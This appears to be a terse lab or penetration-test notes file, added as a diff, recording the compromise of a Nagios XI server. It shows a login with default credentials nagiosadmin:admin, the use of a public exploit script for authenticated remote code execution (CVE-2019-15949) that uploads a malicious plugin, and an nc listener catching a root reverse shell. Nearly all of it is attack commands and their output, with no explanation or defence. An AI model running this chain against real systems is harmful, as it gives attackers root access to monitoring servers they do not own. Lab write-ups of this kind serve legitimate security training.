@@ -1,0 +1,31 @@
+
+
+
+we login using
+
+nagiosadmin:admin
+
+
+VERSION	5.6.0
+
+
+Nagios Xi 5.6.6 - Authenticated Remote Code Execution (RCE)                        | multiple/webapps/52138.txt
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# python3 52138.py -t http://192.168.195.136/ -b /nagiosxi/ -u nagiosadmin -p admin -lh 192.168.45.210 -lp 443
+CVE-2019-15949 Nagiosxi authenticated Remote Code Execution
+Login NSP Token: 46bce3881b832ca00e5bfc0799e18d454f1f36e92c0454d5fa1696b3b0f09888
+Logged in!
+Uploading Malicious Check Ping Plugin
+Upload NSP Token: cce9204c6f2eb63c314754eafc863067a7df7a01ada64c0c0448ac7a1ded0928
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 443                            
+listening on [any] 443 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.195.136] 53114
+bash: cannot set terminal process group (965): Inappropriate ioctl for device
+bash: no job control in this shell
+root@ubuntu:/usr/local/nagiosxi/html/includes/components/profile# 
+
